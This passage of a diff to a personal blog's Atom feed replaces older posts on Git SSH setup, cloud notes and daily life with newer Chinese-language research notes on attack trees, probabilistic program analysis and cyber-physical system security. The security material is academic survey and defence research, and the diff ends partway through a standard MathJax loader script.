 &lt;p&gt;最后，自动生成攻击树和攻击模型。&lt;/p&gt;
 &lt;p&gt;攻击树的根是目标系统，其他节点是子攻击。由于我们已经讲安全需求，按照组件进行了分类，因此，根节点的子节点代表了子节点的组合。子节点之间的关系是OR关系，任何一个组件集合被攻击成功，整个系统同样受到攻击。对每个组件有多种攻击方法，也是OR关系。攻击方法还可以继续分为子攻击，可能是OR或者AND关系。&lt;/p&gt;
-&lt;p&gt;已知代表潜在攻击的攻击树，我们对每种攻击生成攻击模型。将原子攻击建模为原子过程。每个攻击将其子树组合起来构造一个过程。其中AND关系代表两个过程的交织，OR关系代表CSP＃中的选择关系。生成攻击模型的同时，将对应子节点的安全属性组合起来，生成相关的安全属性。&lt;/p&gt;</content><category term="directions"></category></entry><entry><title>My principles</title><link href="http://shangfute.github.com/principles.html" rel="alternate"></link><published>2016-06-17T09:47:33+08:00</published><updated>2016-06-17T09:47:33+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2016-06-17:/principles.html</id><summary type="html">&lt;p&gt;I want to work for myself, to come up with independent opinions, to stress-test them, to be wary about being overconfident, and to reflect on the consequences of your decisions and constantly improve.&lt;/p&gt;</summary><content type="html">&lt;p&gt;I want to work for myself, to come up with independent opinions, to stress-test them, to be wary about being overconfident, and to reflect on the consequences of your decisions and constantly improve.&lt;/p&gt;</content><category term="think"></category></entry><entry><title>Git deploy</title><link href="http://shangfute.github.com/git-ssh-deploy.html" rel="alternate"></link><published>2016-06-16T23:45:23+08:00</published><updated>2016-06-16T23:45:23+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2016-06-16:/git-ssh-deploy.html</id><summary type="html">&lt;p&gt;Git是分布式的代码管理工具，远程的代码管理是基于SSH的，所以要使用远程的Git则需要SSH的配置。
-github的SSH配置如下：
-一 、
-设置Git的user name和email：
-$ git config --global user.name "xuhaiyan"
-$ git config --global user.email "haiyan.xu.vip@gmail.com"&lt;/p&gt;
-&lt;p&gt;二、生成SSH密钥过程：
-1.查看是否已经有了ssh密钥：cd ~/.ssh
-如果没有密钥则不会有此文件夹，有则备份删除
-2.生存密钥：
-$ ssh-keygen -t rsa -C “haiyan.xu.vip@gmail.com”
-按3个回车，密码为空。&lt;/p&gt;
-&lt;p&gt;Your identification has been saved in …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Git是分布式的代码管理工具，远程的代码管理是基于SSH的，所以要使用远程的Git则需要SSH的配置。
-github的SSH配置如下：
-一 、
-设置Git的user name和email：
-$ git config --global user.name "xuhaiyan"
-$ git config --global user.email "haiyan.xu.vip@gmail.com"&lt;/p&gt;
-&lt;p&gt;二、生成SSH密钥过程：
-1.查看是否已经有了ssh密钥：cd ~/.ssh
-如果没有密钥则不会有此文件夹，有则备份删除
-2.生存密钥：
-$ ssh-keygen -t rsa -C “haiyan.xu.vip@gmail.com”
-按3个回车，密码为空。&lt;/p&gt;
-&lt;p&gt;Your identification has been saved in /home/tekkub/.ssh/id_rsa.
-Your public key has been saved in /home/tekkub/.ssh/id_rsa.pub.
-The key fingerprint is:
-………………&lt;/p&gt;
-&lt;p&gt;最后得到了两个文件：id_rsa和id_rsa.pub&lt;/p&gt;
-&lt;p&gt;3.添加密钥到ssh：ssh-add 文件名
-需要之前输入密码。
-4.在github上添加ssh密钥，这要添加的是“id_rsa.pub”里面的公钥。
-打开https://github.com/ ，登陆xuhaiyan825，然后添加ssh。&lt;/p&gt;
-&lt;p&gt;5.测试：ssh git@github.com
-The authenticity of host ‘github.com (207.97.227.239)’ can’t be established.
-RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.
-Are you sure you want to continue connecting (yes/no)? yes
-Warning: Permanently added ‘github.com,207.97.227.239′ (RSA) to the list of known hosts.
-ERROR: Hi tekkub! You’ve successfully authenticated, but GitHub does not provide shell access
-Connection to github.com closed.&lt;/p&gt;
-&lt;p&gt;三、 开始使用github
-1.获取源码：
-$ git clone git@github.com:billyanyteen/github-services.git
-2.这样你的机器上就有一个repo了。
-3.git于svn所不同的是git是分布式的，没有服务器概念。所有的人的机器上都有一个repo，每次提交都是给自己机器的repo
-仓库初始化：
-git init
-生成快照并存入项目索引：
-git add
-文件,还有git rm,git mv等等…
-项目索引提交：
-git commit
-4.协作编程：
-将本地repo于远程的origin的repo合并，
-推送本地更新到远程：
-git push origin master
-更新远程更新到本地：
-git pull origin master
-补充：
-添加远端repo：
-$ git remote add upstream git://github.com/pjhyett/github-services.git
-重命名远端repo：
-$ git://github.com/pjhyett/github-services.git为“upstream”&lt;/p&gt;</content><category term="web"></category><category term="learn"></category></entry><entry><title>cloud concepts notes</title><link href="http://shangfute.github.com/cloud-concepts.html" rel="alternate"></link><published>2016-05-29T11:40:14+08:00</published><updated>2016-05-29T11:40:14+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2016-05-29:/cloud-concepts.html</id><summary type="html">&lt;p&gt;Cloud = Lots of storage + computer cycles nearby&lt;/p&gt;
-&lt;p&gt;single-site cloud
-geographically distributed cloud&lt;/p&gt;
-&lt;p&gt;servers -&amp;gt; top of rack switch -&amp;gt; core switch&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Massive scale  e.g.  Microsoft 150k machines&lt;/li&gt;
-&lt;li&gt;On-demand acess: *aaS classification
-    Infrastructure as a Service
-    Platform as a Service
-    Software as a Service&lt;/li&gt;
-&lt;li&gt;Data-intensive Nature
-    vs. Computation-intensive computing : MPI&lt;/li&gt;
-&lt;li&gt;New Cloud …&lt;/li&gt;&lt;/ol&gt;</summary><content type="html">&lt;p&gt;Cloud = Lots of storage + computer cycles nearby&lt;/p&gt;
-&lt;p&gt;single-site cloud
-geographically distributed cloud&lt;/p&gt;
-&lt;p&gt;servers -&amp;gt; top of rack switch -&amp;gt; core switch&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;Massive scale  e.g.  Microsoft 150k machines&lt;/li&gt;
-&lt;li&gt;On-demand acess: *aaS classification
-    Infrastructure as a Service
-    Platform as a Service
-    Software as a Service&lt;/li&gt;
-&lt;li&gt;Data-intensive Nature
-    vs. Computation-intensive computing : MPI&lt;/li&gt;
-&lt;li&gt;New Cloud Programming Paradigms
-    MapReduce/Hadoop
-    NoSQL&lt;/li&gt;
-&lt;/ol&gt;</content></entry><entry><title>走进网络科幻</title><link href="http://shangfute.github.com/read-novel.html" rel="alternate"></link><published>2016-05-28T09:47:33+08:00</published><updated>2016-05-28T09:47:33+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2016-05-28:/read-novel.html</id><summary type="html">&lt;p&gt;尽管我知道看小说特别浪费时间，但是最近还是破了戒，看了《走进修仙》。这篇小说前半部分还是很吸引人的，很有创意。但是到了后面相关知识的错误越来越多，有点接受不能了，而特别冗长。直接看不下去了。&lt;/p&gt;
-&lt;p&gt;如果有时间还是读一些受到很多好评，靠得住的书吧。&lt;/p&gt;</summary><content type="html">&lt;p&gt;尽管我知道看小说特别浪费时间，但是最近还是破了戒，看了《走进修仙》。这篇小说前半部分还是很吸引人的，很有创意。但是到了后面相关知识的错误越来越多，有点接受不能了，而特别冗长。直接看不下去了。&lt;/p&gt;
-&lt;p&gt;如果有时间还是读一些受到很多好评，靠得住的书吧。&lt;/p&gt;</content></entry><entry><title>洗衣服</title><link href="http://shangfute.github.com/wash-clothes.html" rel="alternate"></link><published>2016-05-27T09:47:33+08:00</published><updated>2016-05-27T09:47:33+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2016-05-27:/wash-clothes.html</id><summary type="html">&lt;p&gt;又带着东西把衣服扔洗衣机了，洗完出来全都带着纸的纤维。囧&lt;/p&gt;</summary><content type="html">&lt;p&gt;又带着东西把衣服扔洗衣机了，洗完出来全都带着纸的纤维。囧&lt;/p&gt;</content></entry><entry><title>Learn Haskell</title><link href="http://shangfute.github.com/haskell.html" rel="alternate"></link><published>2016-05-26T23:33:07+08:00</published><updated>2016-05-26T23:33:07+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2016-05-26:/haskell.html</id><summary type="html">&lt;p&gt;I found an interesting tuturial of Haskell programming language today, and had fun with the magic features of functional programming, lazy evaluation, type system and pattern matching. They are very different from the instructive programming language and very expressive. I want to learn more about how to translate them into …&lt;/p&gt;</summary><content type="html">&lt;p&gt;I found an interesting tuturial of Haskell programming language today, and had fun with the magic features of functional programming, lazy evaluation, type system and pattern matching. They are very different from the instructive programming language and very expressive. I want to learn more about how to translate them into lambda calculation. I knew some techniques frome the SICP, but more details about realization need to practice. Maybe I would try to make some contribution to the community.&lt;/p&gt;</content><category term="functioanl programming"></category><category term="haskell"></category></entry><entry><title>并行架构</title><link href="http://shangfute.github.com/parallel-architechture.html" rel="alternate"></link><published>2016-05-24T22:57:17+08:00</published><updated>2016-05-24T22:57:17+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2016-05-24:/parallel-architechture.html</id><summary type="html">&lt;p&gt;并行架构分为位级并行、指令级并行、数据级并行以及任务级并行。&lt;/p&gt;
+&lt;p&gt;已知代表潜在攻击的攻击树，我们对每种攻击生成攻击模型。将原子攻击建模为原子过程。每个攻击将其子树组合起来构造一个过程。其中AND关系代表两个过程的交织，OR关系代表CSP＃中的选择关系。生成攻击模型的同时，将对应子节点的安全属性组合起来，生成相关的安全属性。&lt;/p&gt;</content></entry><entry><title>概率程序分析</title><link href="http://shangfute.github.com/probablistic-program-analysis.html" rel="alternate"></link><published>2017-10-27T19:29:33+08:00</published><updated>2017-10-27T19:29:33+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2017-10-27:/probablistic-program-analysis.html</id><summary type="html">&lt;p&gt;研究对不确定性变量进行计算的程序。&lt;/p&gt;
+&lt;h2&gt;研究目标&lt;/h2&gt;
+&lt;p&gt;开发静态和动态分析技术，能够将概率程序看成随机过程进行推理。&lt;/p&gt;
+&lt;h2&gt;应用领域&lt;/h2&gt;
+&lt;p&gt;分析机器学习中使用的模型：当输入存在噪声时，分类器性能如何变化。&lt;/p&gt;
+&lt;p&gt;分析随机化计算：系统化建立随机算法的属性。&lt;/p&gt;
+&lt;p&gt;分析传感器数据融合算法：对融合算法进行推理。&lt;/p&gt;
+&lt;h2&gt;主要关注的问题&lt;/h2&gt;
+&lt;p&gt;随机化安全性：给定概率程序P和状态集合U，在N步内程序执行到U的概率是多少。&lt;/p&gt;
+&lt;p&gt;时序逻辑属性：研究以1的概率成立的时序逻辑属性，包括，几乎确定终止（程序以1的概率终止），几乎确定常返（程序无限次访问某个状态集合），几乎确定持续（程序执行到某个状态集合，并永远留在集合内），以及整改暂态属性体系。&lt;/p&gt;
+&lt;h2&gt;研究途径&lt;/h2&gt;
+&lt;p&gt;概率程序的符号化推理：通过符号化决策过程对概率程序的抽象语义进行推理。&lt;/p&gt;
+&lt;p&gt;使用符号化执行和解空间大小计算的方法根据有限的执行路径获得整个程序的属性。&lt;/p&gt;</summary><content type="html">&lt;p&gt;研究对不确定性变量进行计算的程序。&lt;/p&gt;
+&lt;h2&gt;研究目标&lt;/h2&gt;
+&lt;p&gt;开发静态和动态分析技术，能够将概率程序看成随机过程进行推理。&lt;/p&gt;
+&lt;h2&gt;应用领域&lt;/h2&gt;
+&lt;p&gt;分析机器学习中使用的模型：当输入存在噪声时，分类器性能如何变化。&lt;/p&gt;
+&lt;p&gt;分析随机化计算：系统化建立随机算法的属性。&lt;/p&gt;
+&lt;p&gt;分析传感器数据融合算法：对融合算法进行推理。&lt;/p&gt;
+&lt;h2&gt;主要关注的问题&lt;/h2&gt;
+&lt;p&gt;随机化安全性：给定概率程序P和状态集合U，在N步内程序执行到U的概率是多少。&lt;/p&gt;
+&lt;p&gt;时序逻辑属性：研究以1的概率成立的时序逻辑属性，包括，几乎确定终止（程序以1的概率终止），几乎确定常返（程序无限次访问某个状态集合），几乎确定持续（程序执行到某个状态集合，并永远留在集合内），以及整改暂态属性体系。&lt;/p&gt;
+&lt;h2&gt;研究途径&lt;/h2&gt;
+&lt;p&gt;概率程序的符号化推理：通过符号化决策过程对概率程序的抽象语义进行推理。&lt;/p&gt;
+&lt;p&gt;使用符号化执行和解空间大小计算的方法根据有限的执行路径获得整个程序的属性。&lt;/p&gt;</content></entry><entry><title>CPS异常检测-形式化方法</title><link href="http://shangfute.github.com/CPS-Anomaly-Detection.html" rel="alternate"></link><published>2017-09-17T19:29:33+08:00</published><updated>2017-09-17T19:29:33+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2017-09-17:/CPS-Anomaly-Detection.html</id><summary type="html">&lt;p&gt;假设控制算法和估计算法的设计者十分了解物理系统，并且假设物理系统是线性系统。&lt;/p&gt;
+&lt;p&gt;但是，现在的CPS越来越复杂，并且存在人的影响，其行为很难预测，这些假设不一定成立。&lt;/p&gt;
+&lt;p&gt;CPS的复杂性
+人的复杂性建模 － 航管员
+从数据中推理出能够区分想要的和不想要的行为的STL公式。 公式可以指示出每个行为集合可能的原因。 使用鲁棒度的概念在这个行为集合上进行有向搜索。&lt;/p&gt;
+&lt;p&gt;研究新的算法从数据中学习出STL规格，而STL规格可以使用自然语言解释。&lt;/p&gt;</summary><content type="html">&lt;p&gt;假设控制算法和估计算法的设计者十分了解物理系统，并且假设物理系统是线性系统。&lt;/p&gt;
+&lt;p&gt;但是，现在的CPS越来越复杂，并且存在人的影响，其行为很难预测，这些假设不一定成立。&lt;/p&gt;
+&lt;p&gt;CPS的复杂性
+人的复杂性建模 － 航管员
+从数据中推理出能够区分想要的和不想要的行为的STL公式。 公式可以指示出每个行为集合可能的原因。 使用鲁棒度的概念在这个行为集合上进行有向搜索。&lt;/p&gt;
+&lt;p&gt;研究新的算法从数据中学习出STL规格，而STL规格可以使用自然语言解释。&lt;/p&gt;</content><category term="Signal Temporal Logic"></category><category term="Anomaly Detection"></category></entry><entry><title>认知论</title><link href="http://shangfute.github.com/recognition.html" rel="alternate"></link><published>2017-09-14T19:29:33+08:00</published><updated>2017-09-14T19:29:33+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2017-09-14:/recognition.html</id><summary type="html">&lt;p&gt;唯理论：从逻辑假设出发，进行推理。形式化方法。知识表示，逻辑推理，符号主义。无法处理不确定性。&lt;/p&gt;
+&lt;p&gt;经验论：从经验数据中总结公式。机器学习，深度学习。概率，连接主义。黑盒，不知道根据那些规则进行推理的，无法验证。&lt;/p&gt;
+&lt;p&gt;但是机器学习得出的结论，不够理性，无法知道事件之间潜在因果关系。不知道我是否知道，也不知道我是否不知道。我们如何知道我知道，如何知道我们不知道什么。深度学习需要大量训练数据才能工作，但人类只需要少量的sample就可以学到大量知识。&lt;/p&gt;
+&lt;p&gt;对概率推理进行建模。因为现在的CPS模型和攻击者模型十分复杂，难以使用数学公式进行建模。特别是对人（控制员和攻击者）的认知模型进行建模。&lt;/p&gt;
+&lt;p&gt;混合自动机的可达性分析：已知系统模型和规格的验证问题&lt;/p&gt;</summary><content type="html">&lt;p&gt;唯理论：从逻辑假设出发，进行推理。形式化方法。知识表示，逻辑推理，符号主义。无法处理不确定性。&lt;/p&gt;
+&lt;p&gt;经验论：从经验数据中总结公式。机器学习，深度学习。概率，连接主义。黑盒，不知道根据那些规则进行推理的，无法验证。&lt;/p&gt;
+&lt;p&gt;但是机器学习得出的结论，不够理性，无法知道事件之间潜在因果关系。不知道我是否知道，也不知道我是否不知道。我们如何知道我知道，如何知道我们不知道什么。深度学习需要大量训练数据才能工作，但人类只需要少量的sample就可以学到大量知识。&lt;/p&gt;
+&lt;p&gt;对概率推理进行建模。因为现在的CPS模型和攻击者模型十分复杂，难以使用数学公式进行建模。特别是对人（控制员和攻击者）的认知模型进行建模。&lt;/p&gt;
+&lt;p&gt;混合自动机的可达性分析：已知系统模型和规格的验证问题&lt;/p&gt;</content></entry><entry><title>几点关于CPS加密的初步想法</title><link href="http://shangfute.github.com/cps-enc.html" rel="alternate"></link><published>2017-03-21T22:01:49+08:00</published><updated>2017-03-21T22:01:49+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2017-03-21:/cps-enc.html</id><summary type="html">&lt;p&gt;现在的CPS传感器和激励器一般没有加密，因而容易产生各种完整性攻击方式。而直接加密的话，对计算性能要求较高，有没有一种半加密的方式，满足两者的要求。&lt;/p&gt;
+&lt;p&gt;基于格理论的密码学与随机性有关，是否可以与实际物理系统关联起来，利用物理系统的随机性？&lt;/p&gt;
+&lt;p&gt;根据CPS的随机性分布，建立满足随机性的程序分析方法。&lt;/p&gt;</summary><content type="html">&lt;p&gt;现在的CPS传感器和激励器一般没有加密，因而容易产生各种完整性攻击方式。而直接加密的话，对计算性能要求较高，有没有一种半加密的方式，满足两者的要求。&lt;/p&gt;
+&lt;p&gt;基于格理论的密码学与随机性有关，是否可以与实际物理系统关联起来，利用物理系统的随机性？&lt;/p&gt;
+&lt;p&gt;根据CPS的随机性分布，建立满足随机性的程序分析方法。&lt;/p&gt;</content><category term="cps"></category><category term="crypto"></category></entry><entry><title>CPS 安全综述</title><link href="http://shangfute.github.com/cps-security.html" rel="alternate"></link><published>2017-02-23T09:25:08+08:00</published><updated>2017-02-23T09:25:08+08:00</updated><author><name>尚福特</name></author><id>tag:shangfute.github.com,2017-02-23:/cps-security.html</id><summary type="html">&lt;p&gt;本文是对&lt;code&gt;Cyber-Physical Systems Security: a Systematic Mapping Study&lt;/code&gt;的学习笔记。&lt;/p&gt;
+&lt;h2&gt;0. 引言&lt;/h2&gt;
+&lt;p&gt;Cyber-physical systems (CPS) 是完成&lt;strong&gt;计算、通信、控制&lt;/strong&gt;的软硬件的无缝集成，与物理组件联合设计。由控制器、传感器、激励器三大组件构成。在2006年左右提出。&lt;/p&gt;
+&lt;p&gt;CPS的应用领域包括：可信医疗设备、生活助理、交通管控、能源保护、环境控制、航空、关键基础设施（电力、水资源、通信系统等）、制造业、智慧建筑等。可以预见CPS的发展将使20世纪的IT技术革命相形见绌。&lt;/p&gt;
+&lt;p&gt;CPS与传统IT系统的区别：CPS是资源受限的实时系统。&lt;/p&gt;
+&lt;p&gt;毫无疑问这些系统的&lt;strong&gt;安全性(security)&lt;/strong&gt;是需要考虑的主要因素。环境的不确定性、安全攻击、物理设备的故障都可能导致安全问题。&lt;/p&gt;
+&lt;p&gt;给定CPS中使用的&lt;strong&gt;估计和控制算法&lt;/strong&gt;，设计要满足的 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;本文是对&lt;code&gt;Cyber-Physical Systems Security: a Systematic Mapping Study&lt;/code&gt;的学习笔记。&lt;/p&gt;
+&lt;h2&gt;0. 引言&lt;/h2&gt;
+&lt;p&gt;Cyber-physical systems (CPS) 是完成&lt;strong&gt;计算、通信、控制&lt;/strong&gt;的软硬件的无缝集成，与物理组件联合设计。由控制器、传感器、激励器三大组件构成。在2006年左右提出。&lt;/p&gt;
+&lt;p&gt;CPS的应用领域包括：可信医疗设备、生活助理、交通管控、能源保护、环境控制、航空、关键基础设施（电力、水资源、通信系统等）、制造业、智慧建筑等。可以预见CPS的发展将使20世纪的IT技术革命相形见绌。&lt;/p&gt;
+&lt;p&gt;CPS与传统IT系统的区别：CPS是资源受限的实时系统。&lt;/p&gt;
+&lt;p&gt;毫无疑问这些系统的&lt;strong&gt;安全性(security)&lt;/strong&gt;是需要考虑的主要因素。环境的不确定性、安全攻击、物理设备的故障都可能导致安全问题。&lt;/p&gt;
+&lt;p&gt;给定CPS中使用的&lt;strong&gt;估计和控制算法&lt;/strong&gt;，设计要满足的&lt;strong&gt;运行目标（operational goals）&lt;/strong&gt;（例如，闭环稳定性、安全性safety、存活性liveness、性能最优化性），可以定义CPS中的三大安全（security）特性：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;机密性(Confidentiality)：防止攻击者通过窃听通信链路和边信道攻击节点的方法推断物理系统的状态。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;完整性(integrity)：通过预防、检测、缓解等方式，防御针对控制器、传感器、激励器的欺骗攻击，维持运行目标。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;可用性(availability)：通过预防、缓解针对控制器、传感器、激励器的拒绝服务攻击，维持运行目标。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;注意：safety是CPS运行目标中的物理特性，而security是由很多特性组成的性质。security会间接影响safety。但满足safety不一定满足security。&lt;/p&gt;
+&lt;p&gt;从系统层考虑安全性的两个途径：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;安全设计：根据多层安全方法、纵深防御策略、移动目标防御范式等原则进行设计。在CPS设计与分析时，需要考虑实际和理性攻击者模型，根据量化安全度量，进行架构的可信分析。为了保证系统设计和实现的安全性、正确性，可以采用形式化验证方法，例如，定理证明或模型检查。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;安全机制：涉及而不局限于CPS的传网络安全机制包括认证、访问控制、审计、密码学、边界保护等。入侵检测、自动响应和恢复等响应式安全机制反而可以有效利用CPS的特征，根据物理系统的模型揭露异常行为。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;1. 研究领域枚举：问题会出现在哪里？&lt;/h2&gt;
+&lt;h3&gt;1.1 第一维度：目标系统&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;电网&lt;/li&gt;
+&lt;li&gt;航空管制&lt;/li&gt;
+&lt;li&gt;工业控制&lt;/li&gt;
+&lt;li&gt;物联网&lt;/li&gt;
+&lt;li&gt;无人机&lt;/li&gt;
+&lt;li&gt;……&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;根据统计大多数研究集中在电网领域。这可能由于智能电网被认为是持续发展、生活质量、国家竞争力的驱动器，所以吸引了大量的研究力量。&lt;/p&gt;
+&lt;p&gt;少量研究集中在无人驾驶汽车、航空系统、智能楼宇系统领域。这些研究领域相对较新，第一篇研究出现在2012年，是未来的研究方向。&lt;/p&gt;
+&lt;p&gt;不同物理领域会采用不同的数学模型进行描述。通常采用线性时不变或非线性动态模型进行建模。为了描述物理模型与实际控制系统的差异，一般有三类过程噪声模型：高斯噪声，有界噪声（非随机），无噪声。根据不同噪声假设，产生不同的传感器量测模型。&lt;/p&gt;
+&lt;h3&gt;1.2 第二维度：安全属性&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Confidentiality：机密性&lt;/li&gt;
+&lt;li&gt;Integrity：数据、来源完整性&lt;/li&gt;
+&lt;li&gt;Availability：可用性&lt;/li&gt;
+&lt;li&gt;Authentication：认证性&lt;/li&gt;
+&lt;li&gt;Authorization：授权性&lt;/li&gt;
+&lt;li&gt;Non-repudiation：不可抵赖性&lt;/li&gt;
+&lt;li&gt;……&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;超过90%的研究集中在CPS完整性方面。只有少量研究关注可用性和机密性方面，应用博弈论设计智能干扰攻击的防御手段。&lt;/p&gt;
+&lt;h3&gt;1.3 第三维度：系统组件&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;传感器&lt;/li&gt;
+&lt;li&gt;激励器&lt;/li&gt;
+&lt;li&gt;通信系统&lt;/li&gt;
+&lt;li&gt;控制系统&lt;/li&gt;
+&lt;li&gt;设备（plant）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;攻击或防御手段一般针对五种系统组件的特定集合中。例如，虚假数据注入攻击主要目标是一组传感器。load altering可以攻击一组激励器。&lt;/p&gt;
+&lt;p&gt;从实践角度看，攻击一个传感器可以解释为攻击传感器节点本身，也可以解释为攻击传感器和接收设备之间的通信链路。攻击激励器同理。因此，攻击网络一般指拒绝服务攻击或攻击传输调度、路由等网络相关的缺陷。同理，攻击控制器指攻击控制器的缺陷。而攻击设备指对物理层的攻击和窃听。&lt;/p&gt;
+&lt;h3&gt;1.4 第四维度：估计算法&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;最小二乘法&lt;/li&gt;
+&lt;li&gt;（扩展）卡尔曼滤波方法&lt;/li&gt;
+&lt;li&gt;Luenberger observer&lt;/li&gt;
+&lt;li&gt;&lt;span class="math"&gt;\(H_{\infinity}\)&lt;/span&gt;滤波器&lt;/li&gt;
+&lt;li&gt;最小切边平方估计算法&lt;/li&gt;
+&lt;li&gt;其他特有估计算法&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;因为不能量测系统所有状态，所以需要状态估计。研究最多的算法是加权最小二乘法WLS，都涉及电网，因为可以证明在高斯噪声下，WLS是最优的电网状态估计算法。除此以外，还有（扩展）卡尔曼滤波方法、Luenberger observer、&lt;span class="math"&gt;\(H_{\infinity}\)&lt;/span&gt;滤波器、最小切边平方估计算法和其他特有估计算法。&lt;/p&gt;
+&lt;p&gt;特有估计算法包括：针对特定应用的估计算法、针对电网的分布式状态估计算法、通用的抗攻击解决方案、基于图论的抗协作式稀疏攻击的估计算法、考虑赛博影响因子矩阵的改进WLS。&lt;/p&gt;
+&lt;p&gt;为了防御通用CPS的传感器和激励器攻击，Fawzi利用压缩感知和实数误差校正的方法提出了状态重构器。Pajic发现抖动、延迟和同步误差等实现问题能够作为状态估计算法的参数，描述建模误差。 Mo构造了标量状态的最优估计器，使得最坏情况下的预期费用最小，即使攻击者可以对量测任意操作。Weimer等人对随机系统引入最小均方误差剩余，其条件均方误差保持有界，并且独立于加性量测攻击。&lt;/p&gt;
+&lt;p&gt;为了防御线性动态系统的传感器攻击，Shoukry提出抗稀疏攻击的事件触发的Luenberger observer。Shoukry提出一种有效的算法利用SMT方法，隔离被攻击的传感器，估计系统状态。&lt;/p&gt;
+&lt;p&gt;这些研究反映了抗量测攻击状态估计算法是CPS安全领域的研究热点。&lt;/p&gt;
+&lt;h3&gt;1.5 第五维度：异常检测&lt;/h3&gt;
+&lt;p&gt;当前的状态估计算法使用坏数据检测(BDD)算法，检测量测数据中的随机异常值。两种使用最多的BDD假设检验是性能索引测试(performance index test)和最大正则剩余测试(largest normalized residual test)。&lt;/p&gt;
+&lt;h2&gt;2 解决方法有哪些？&lt;/h2&gt;
+&lt;p&gt;第一维度：防御策略&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;攻击&lt;/li&gt;
+&lt;li&gt;形式化安全分析&lt;/li&gt;
+&lt;li&gt;攻击缓解&lt;/li&gt;
+&lt;li&gt;入侵检测&lt;/li&gt;
+&lt;li&gt;……&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;第二维度：理论方法&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;控制论&lt;/li&gt;
+&lt;li&gt;博弈论&lt;/li&gt;
+&lt;li&gt;逻辑学&lt;/li&gt;
+&lt;li&gt;图论&lt;/li&gt;
+&lt;li&gt;统计学习&lt;/li&gt;
+&lt;li&gt;计算理论&lt;/li&gt;
+&lt;li&gt;……&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;第三维度：实验方法&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;仿真系统&lt;/li&gt;
+&lt;li&gt;实测数据&lt;/li&gt;
+&lt;li&gt;理论分析&lt;/li&gt;
+&lt;li&gt;……&lt;/li&gt;
+&lt;/ul&gt;
+&lt;script type="text/javascript"&gt;if (!document.getElementById('mathjaxscript_pelican_#%@#$@#')) {
+    var align = "center",
+        indent = "0em",
+        linebreak = "false";
+
+    if (false) {
+        align = (screen.width &lt; 768) ? "left" : align;
+        indent = (screen.width &lt; 768) ? "0em" : indent;
+        linebreak = (screen.width &lt; 768) ? 'true' : linebreak;
+    }
+
+    var mathjaxscript = document.createElement('script');
+    var location_protocol = (false) ? 'https' : document.location.protocol;
+    if (location_protocol !== 'http' &amp;&amp; location_protocol !== 'https') location_protocol = 'https:';
+    mathjaxscript.id = 'mathjaxscript_pelican_#%@#$@#';
+    mathjaxscript.type = 'text/javascript';
+    mathjaxscript.src = location_protocol + '//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML';
+    mathjaxscript[(window.opera ? "innerHTML" : "text")] =
+        "MathJax.Hub.Config({" +
+        "    config: ['MMLorHTML.js']," +
+        "    TeX: { extensions: ['AMSmath.js','AMSsymbols.js','noErrors.js','noUndefined.js'], equationNumbers: { autoNumber: 'AMS' } }," +
+        "    jax: ['input/TeX','input/MathML','output/HTML-CSS']," +
+        "    extensions: ['tex2jax.js','mml2jax.js','MathMenu.js','MathZoom.js']," +
+        "    displayAlign: '"+ align +"'," +
+        "    displayIndent: '"+ indent +"'," +
+        "    showMathMenu: true," +
+        "    messageStyle: 'normal'," +
+        "    tex2jax: { " +
+        "        inlineMath: [ ['\\\\(','\\\\)'] ], " +
+        "        displayMath: [ ['$$','$$'] ]," +
+        "        processEscapes: true," +
+        "        preview: 'TeX'," +
+        "    }, " +
+        "    'HTML-CSS': { " +
+        "        styles: { '.MathJax_Display, .MathJax .mo, .MathJax .mi, .MathJax .mn': {color: 'inherit ! important'} }," +
+        "        linebreaks: { automatic: "+ linebreak +", width: '90% container' }," +
+        "    }, " +
+        "}); " +
+        "if ('default' !== 'default') {" +
+            "MathJax.Hub.Register.StartupHook('HTML-CSS Jax Ready',function () {" +
+                "var VARIANT = MathJax.OutputJax['HTML-CSS'].FONTDATA.VARIANT;" +
+                "VARIANT['normal'].fonts.unshift('MathJax_default');" +
+                "VARIANT['bold'].fonts.unshift('MathJax_default-bold');" +
+                "VARIANT['italic'].fonts.unshift('MathJax_default-italic');" +
+                "VARIANT['-tex-mathit'].fonts.unshift('MathJax_default-italic');" +
+            "});" +
+            "MathJax.Hub.Register.StartupHook('SVG Jax Ready',function () {" +
